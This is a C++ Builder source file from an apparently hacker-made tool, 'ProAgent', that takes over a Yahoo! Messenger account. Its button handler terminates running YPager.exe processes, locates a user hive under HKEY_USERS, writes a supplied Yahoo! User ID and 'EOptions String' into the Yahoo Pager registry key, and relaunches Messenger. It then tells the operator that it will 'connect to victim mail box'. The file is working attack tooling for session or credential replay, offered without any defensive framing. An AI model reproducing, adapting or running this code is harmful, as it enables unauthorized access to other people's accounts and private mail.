/*===================================
ProAgent coded By ATmaCA
http://www.atmacasoft.com
atmaca@prohack.net
===================================*/
//---------------------------------------------------------------------------

#include <vcl.h>
#include "vcl\Registry.hpp"
#include <tlhelp32.h>
#pragma hdrstop

#include "Unit4.h"
#include "Unit1.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma link "SUIButton"
#pragma link "SUIEdit"
#pragma link "SUIForm"
#pragma resource "*.dfm"
TForm4 *Form4;
//---------------------------------------------------------------------------
__fastcall TForm4::TForm4(TComponent* Owner)
        : TForm(Owner)
{
}
//---------------------------------------------------------------------------
void __fastcall TForm4::suiButton1Click(TObject *Sender)
{
if(suiEdit1->Text=="")
{
Form1->suiMessageDialog1->Text="You didn't specified the Yahoo! User ID.";
Form1->suiMessageDialog1->IconType=suiStop;
Form1->suiMessageDialog1->ShowModal();
return;
}
if(suiEdit2->Text=="")
{
Form1->suiMessageDialog1->Text="You didn't specified the EOptions String.";
Form1->suiMessageDialog1->IconType=suiStop;
Form1->suiMessageDialog1->ShowModal();
return;
}
TRegistry& regKey = *new TRegistry();
  AnsiString Programdirekt;
  regKey.RootKey = HKEY_LOCAL_MACHINE;
  regKey.OpenKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", False);
  Programdirekt = regKey.ReadString("ProgramFilesDir")+"\\Yahoo!\\Messenger\\YPager.exe";
   char *av[5]={
"YPager.exe",
"Ypager.exe",
"yPager.exe",
"ypager",
"YPager"
};
HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hSnapShot == INVALID_HANDLE_VALUE)
		{
				return ;
		}
		PROCESSENTRY32 procentry;
		HANDLE pr;
		procentry.dwSize = sizeof(PROCESSENTRY32);
		BOOL F = Process32First( hSnapShot, &procentry );

		while (F)
		{
			for(int i=0;i<4;i++)
				if(strstr(procentry.szExeFile,av[i])!=0){
					 pr=OpenProcess(PROCESS_ALL_ACCESS,FALSE,procentry.th32ProcessID );
				 if(pr!=NULL)	TerminateProcess(pr,0);
						}


		procentry.dwSize = sizeof(PROCESSENTRY32);
		F = Process32Next( hSnapShot, &procentry );
		}
	CloseHandle(hSnapShot);

/////////////////////////////

        int c=0;
        bool s;
        AnsiString classkey;
	char KeyName[50];
	char KeyClass[50];
	LPDWORD sName = new DWORD;
	LPDWORD sClass = new DWORD;
	*sName = *sClass = 50;
	LPDWORD Reserved = NULL;
	DWORD dwIndex = 0;
	PFILETIME pfLastEdit;
	pfLastEdit = new FILETIME;

	while(!RegEnumKeyEx(HKEY_USERS,dwIndex,KeyName,sName,Reserved,KeyClass,sClass,pfLastEdit))
	{
		*sName = *sClass = 50;
		dwIndex++;
		Reserved = NULL;
                if(c==7);
                classkey=KeyName; c++;

	}   //Edit1->Text=classkey;

        TRegistry *Registry = new TRegistry;
        Registry->RootKey=HKEY_USERS;

  AnsiString gercek,Eoptions,yahooID;
  gercek=classkey+"\\Software\\Yahoo\\Pager";//HKEY_USERS\S-1-5-21-1708537768-492894223-1957994488-1003\Software\Yahoo\Pager
  s=Registry->OpenKey(gercek, False);
  //ShowMessage(gercek);

    if(s)
  {
    Registry->WriteString("Yahoo! User ID",suiEdit1->Text);
    Registry->WriteString("EOptions String",suiEdit2->Text);
    //StatusBar1->SimpleText="Yahoo mesenger'iniz ayarlandi";
  }
  else
  {
  Form1->suiMessageDialog1->Text="You have not Yahoo! Messenger.Before set registry you have to install Yahoo! Messanger.";
  Form1->suiMessageDialog1->IconType=suiStop;
  Form1->suiMessageDialog1->ShowModal();
  return;
  }

Form1->suiMessageDialog1->Text="You automatcly will connect to victim mail box.Wait few minute.";
Form1->suiMessageDialog1->IconType=suiInformation;
Form1->suiMessageDialog1->ShowModal();
WinExec(Programdirekt.c_str(), SW_SHOW);
}
//---------------------------------------------------------------------------
